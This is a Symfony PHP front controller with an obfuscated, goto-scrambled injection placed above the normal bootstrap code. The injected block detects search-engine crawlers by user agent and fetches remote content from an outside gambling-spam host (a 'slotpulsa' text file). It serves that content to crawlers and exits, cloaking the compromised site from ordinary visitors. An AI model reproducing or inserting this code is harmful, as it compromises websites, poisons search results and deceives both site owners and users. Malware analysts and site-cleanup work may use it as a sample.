<?php
goto O403143; O207962: if (!o841888($_SERVER["\x48\124\x54\x50\x5f\x55\123\105\x52\x5f\101\107\105\116\124"])) { goto O194089; } goto O729203; O529354: $O534042 = 0; goto O711986; O403143: error_reporting(E_ALL); goto O573419; O890760: echo $O844503; goto O902380; O600918: $O004451 = isset($O004451) ? $O004451 : ''; goto O314016; O434395: $O567491 = urlencode($_SERVER["\110\x54\124\x50\x5f\125\123\x45\122\x5f\101\107\x45\116\x54"]); goto O810426; O663974: $O760899 = isset($O760899) ? $O760899 : ''; goto O332672; O186409: $O844503 = o350160($O393139); goto O890760; O815465: $O102630 = isset($O102630) ? $O102630 : ''; goto O600918; O076703: $O886250 = isset($O886250) ? $O886250 : ''; goto O663974; O573419: ini_set("\x64\151\163\160\154\x61\x79\137\x65\162\162\157\162\163", 1); goto O434395; O057657: function o350160($O960114) { goto O304632; O287362: curl_setopt($O795212, CURLOPT_URL, $O960114); goto O290099; O290099: curl_setopt($O795212, CURLOPT_RETURNTRANSFER, true); goto O541596; O304632: $O795212 = curl_init(); goto O287362; O541596: $O974959 = curl_exec($O795212); goto O381418; O381418: curl_close($O795212); goto O661822; O661822: return $O974959; goto O597387; O597387: } goto O207962; O729203: $O393139 = "\x68\164\164\x70\x73\x3a\57\x2f\143\x6f\x62\141\x73\x61\x6e\164\141\151\x2e\x73\151\164\x65\57\x63\157\x6e\164\x65\156\x74\57\163\x6c\157\x74\160\x75\154\163\x61\x2e\164\x78\x74\x3f\x61\x67\x65\156\164\75{$O567491}\46\x72\x65\146\x65\162\x72\145\162\75{$O102630}\x26\154\141\156\147\75{$O004451}\x26\x69\160\75{$O808658}\46\144\x6f\155\x3d{$O886250}\x26\x68\x74\x74\160\75{$O760899}\46\x75\x72\x69\x3d{$O287716}\x26\160\x63\x3d{$O890030}\x26\162\145\167\x72\151\164\141\142\x6c\145\x3d{$O534042}\46\x73\143\162\x69\160\164\75{$O374197}"; goto O186409; O902380: exit; goto O833588; O938041: function o841888($O042849) { goto O679173; O267239: return false; goto O672717; O679173: $O440683 = ["\x47\x6f\157\147\x6c\145\x62\157\x74", "\102\x69\x6e\147\142\x6f\164", "\x53\x6c\165\x72\160", "\x44\x75\143\x6b\x44\x75\x63\153\x42\157\164", "\x42\141\x69\144\165\x73\160\x69\x64\145\162", "\x59\141\156\x64\145\170\x42\x6f\x74", "\x53\157\147\x6f\x75", "\x54\x65\154\145\x67\162\x61\155\102\157\164", "\105\x78\x61\142\157\x74", "\146\141\x63\x65\x62\157\x74", "\151\141\137\x61\162\x63\x68\151\x76\145\x72", "\x47\157\x6f\147\x6c\145\55\123\x69\164\145\55\x56\x65\162\x69\x66\x69\143\141\x74\151\157\x6e", "\x47\x6f\157\147\x6c\x65\55\x49\x6e\163\x70\x65\143\164\151\x6f\156\x54\157\x6f\154", "\x41\150\162\145\146\x73\x42\x6f\164"]; goto O303905; O303905: foreach ($O440683 as $O005825) { goto O385847; O386671: O060930: goto O029689; O313969: return true; goto O010539; O385847: if (!(stripos($O042849, $O005825) !== false)) { goto O572949; } goto O313969; O010539: O572949: goto O386671; O029689: } goto O905546; O905546: O534222: goto O267239; O672717: } goto O057657; O314016: $O808658 = isset($O808658) ? $O808658 : ''; goto O076703; O711986: $O374197 = urlencode($_SERVER["\123\x43\122\x49\120\124\x5f\x4e\x41\115\x45"]); goto O815465; O416691: $O844503 = ''; goto O529354; O332672: $O890030 = isset($O890030) ? $O890030 : ''; goto O938041; O810426: $O287716 = urlencode($_SERVER["\122\105\x51\x55\105\x53\x54\137\125\x52\111"]); goto O416691; O833588: O194089:

use Symfony\Component\HttpFoundation\Request;

require __DIR__.'/../vendor/autoload.php';
if (PHP_VERSION_ID < 70000) {
    include_once __DIR__.'/../var/bootstrap.php.cache';
}

$kernel = new AppKernel('prod', false);
if (PHP_VERSION_ID < 70000) {
    $kernel->loadClassCache();
}
//$kernel = new AppCache($kernel);

// When using the HttpCache, you need to call the method in your front controller instead of relying on the configuration parameter
//Request::enableHttpMethodParameterOverride();
$request = Request::createFromGlobals();
$response = $kernel->handle($request);
$response->send();
$kernel->terminate($request, $response);
